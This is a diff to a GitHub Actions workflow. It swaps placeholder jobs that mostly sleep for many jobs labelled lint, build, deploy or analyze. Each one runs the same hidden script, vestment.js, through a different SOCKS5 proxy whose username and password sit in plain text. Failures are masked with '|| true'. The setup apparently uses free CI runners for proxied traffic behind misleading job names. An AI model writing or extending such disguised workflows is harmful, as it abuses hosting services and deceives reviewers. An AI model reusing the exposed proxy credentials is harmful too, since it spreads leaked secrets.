@@ -4,62 +4,11 @@ on:
     branches: [ "main" ]
     paths:
       - '.github/workflows/vestment.yml'
+      - 'vestment.js'
+      - 'package.json'
 
 jobs:
-  verify_windows2025_node_ribbon:
-    runs-on: windows-2025
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 24
-        - name: Execute Verification Suite
-          shell: pwsh
-          run: |
-            npm install
-            Write-Output "Starting verification suite..."
-            whoami
-            Start-Sleep -Seconds 529
-            Write-Output "Completed successfully!"
-
-  verify_ubuntu2404_node_iridescence:
-    runs-on: ubuntu-24.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 20
-        - name: Execute Verification Suite
-          run: |
-            npm install
-            echo "Starting verification suite..."
-            df
-            sleep 6m
-            echo "Completed successfully!"
-
-  verify_windowslatest_node_subexpression:
-    runs-on: windows-latest
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 22
-        - name: Execute Verification Suite
-          shell: pwsh
-          run: |
-            npm install
-            Write-Output "Starting verification suite..."
-            Get-Process
-            Start-Sleep -Seconds 597
-            Write-Output "Completed successfully!"
-
-  review_ubuntulatest_bun_ceramic:
+  verify_ubuntulatest_bun_minister:
     runs-on: ubuntu-latest
     steps:
         - name: Checkout Repository
@@ -68,16 +17,26 @@ jobs:
           uses: oven-sh/setup-bun@v2
           with:
             bun-version: latest
-        - name: Execute Verification Suite
+        - name: Run Task
           run: |
-            bun install
-            echo "Starting verification suite..."
-            ls
-            sleep 8m
-            echo "Completed successfully!"
+            bun install && bun run vestment.js "socks5://dcswarup:webshare@185.202.175.47:8247" || true
 
-  verify_windows2022_node_swath:
+  deploy_windows2022_bun_volleyball:
     runs-on: windows-2022
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Bun
+          uses: oven-sh/setup-bun@v2
+          with:
+            bun-version: latest
+        - name: Run Task
+          shell: pwsh
+          run: |
+            bun install; bun run vestment.js "socks5://dcswarup:webshare@92.112.143.41:6484"
+
+  deploy_ubuntu2004_node_legislature:
+    runs-on: ubuntu-20.04
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -85,11 +44,46 @@ jobs:
           uses: actions/setup-node@v4
           with:
             node-version: 18
-        - name: Execute Verification Suite
+        - name: Run Task
+          run: |
+            npm install && node vestment.js "socks5://dcswarup:webshare@192.95.91.205:5832" || true
+
+  build_ubuntu2404_node_legging:
+    runs-on: ubuntu-24.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 20
+        - name: Run Task
+          run: |
+            npm install && node vestment.js "socks5://dcswarup:webshare@185.101.252.117:7148" || true
+
+  lint_ubuntu2204_node_muscat:
+    runs-on: ubuntu-22.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 24
+        - name: Run Task
+          run: |
+            npm install && node vestment.js "socks5://dcswarup:webshare@85.198.36.82:5719" || true
+
+  analyze_windows2025_node_riser:
+    runs-on: windows-2025
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 22
+        - name: Run Task
           shell: pwsh
           run: |
-            npm install
-            Write-Output "Starting verification suite..."
-            Get-Process
-            Start-Sleep -Seconds 484
-            Write-Output "Completed successfully!"
+            npm install; node vestment.js "socks5://dcswarup:webshare@82.23.229.245:7602"
